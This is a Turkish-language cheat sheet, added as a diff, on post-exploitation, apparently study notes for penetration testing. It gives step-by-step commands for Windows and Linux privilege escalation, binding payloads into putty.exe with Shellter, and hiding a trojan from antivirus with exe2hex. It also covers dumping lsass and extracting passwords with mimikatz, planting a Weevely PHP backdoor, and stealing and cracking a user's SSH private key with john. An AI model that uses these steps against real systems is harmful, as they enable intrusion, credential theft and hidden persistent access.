@@ -1,0 +1,75 @@
+## 09. POST EXPLOİTATİON (İSTİSMAR SONRASI):
+
+### YETKİ YÜKSELTME (WINDOWS)
+    systeminfo hotfix dosyalarına bak. Güncelleme almayan yamayı bul. Sisteme sok.Yetki yükselt.
+    
+    Güncellemelerin Kontrolü : wmic qfe get Description, HotFixID, InstalledOn
+   
+    Yüklü uygulamaların kontrolü :  “wmic product get name, version”
+   
+    Bilinmeyen Path Yollarını Kontrol Etme : accessChk.exe aracıyla 
+    
+    Msi paketinin yüklenmesinin kontrolü : “reg query 
+    
+    HKEY_CURRENT_USER\Software\Policies\Microsoft\Windows\Installer”  -> PS ekranına komutu girin. Değer 1 olarak ayarlıysa zafiyet mevcuttur. Zafiyeti tetiklemek için msi paketi üretmek gerekir.
+    Import-Module .\powerup.ps1
+    Write-UserAddMSI ile kullanıcı oluştur.
+
+### YETKİ YÜKSELTME (LINUX)
+    ***Kernel kontrol et. “uname -a” ile kernel sürümüne bak. Exploit ara.
+    “searchsploit” den ara
+
+    *** sudo –l komutu ile sudoers yetkilerini kontrol et.
+
+### Shellter :
+	Oluşturulan zararlıyı başka dosyayla birleştirme aracı.
+    Windows örneği : 
+	a -> Enter -> no -> putty.exe -> y
+	7 payload var. l seçersek listeden c seçersek kendi payloadımız.
+	l -> 1 -> ip adresi -> port -> 
+
+### Exe2Hex :
+    exe dosyalarını binary kodlarına çeviren araç. Bu sayede virüs programları bulamıyor.
+    Örnek : Önce payload oluşturuyoruz. (SET programı ile)
+    1 -> 4 creat payload -> 2 -> local ip gir -> port gir -> trojen oluştu. (payload.exe)
+    “exe2hex -x payload.exe -p payload.cmd”
+    Oluşturulan payload.cmd dosyasını metin belgesi ile aç. En sonuna hemen çalışması için start payload.exe gir .Kaydet.
+    Hedef pc’de çalıştığında önce exe haline çevirir. En son yazdığımız komutla o exe çalışır.
+
+### Mimikatz :
+    Windows üzerinde parola elde etmeye yarayan araç.
+    1.	Görev yöneticisinden lsass.exe ‘yi dump al.
+    2.	Dinleme moduna al;	
+    mimikatz # privilege::debug
+    3.	Dump dosyasını mimikatz klasörüne at yada yolunu belirt.
+    mimikatz # sekurlsa::minidump lsass.dmp
+    4.	mimikatz # sekurlsa::logonPasswords full
+
+### Powersploit :
+	Windows üzerinde powershell ile çalışır.
+
+### Proxy Chains :
+	Ağ testlerinde gizlilik sağlayan bir araç. (Tor ağı üzerinden). Hız olarak biraz yavaş.
+
+### 4nonimizer :
+	Ağ üzerinde gizlilik sağlar.
+
+	https://github.com/Hackplayers/4nonimizer.git githubdan indir.
+	
+	./4nonimizer install -> Yükle
+	
+	./4nonimizer start -> Programı başlat. ip adresini değiştirir.Vpn mantığı. Durdurmak için stop komutunu kullan
+
+### Weevely :
+	Php sunucularda virüs programına ve güvenlik duvarlarına yakalanmayan troje oluşturmaya yarar.
+	“weevely generate 12345 /root/...  .php” (Arka kapı oluşturma işlemi)
+    “weevely hedefe_atmış_olduğun_dosya_yolu 12345”
+
+### SSH Private Key
+    Sisteme girdikten sonra yetkili kullanıcının SSH Private Keyini /home/yetkili_kullanıcı/.ssh dizini altından okuyorsak locale alıp id_rsa.txt olarak kaydet.
+    
+    python3 /usr/share/john/ssh2john.py id_rsa.txt > decrypted.txt   (john anlayacağı şekle dönüştürür)
+    
+    john --wordlist=/usr/share/wordlists/rockyou.txt decrypted.txt (şifreyi kırar)
+    
+    ssh yetkili_kullanıcı@hedef_ip -i id_rsa.txt  (bağlan)  (yetki hatası verirse 0400 olarak chmod ver)
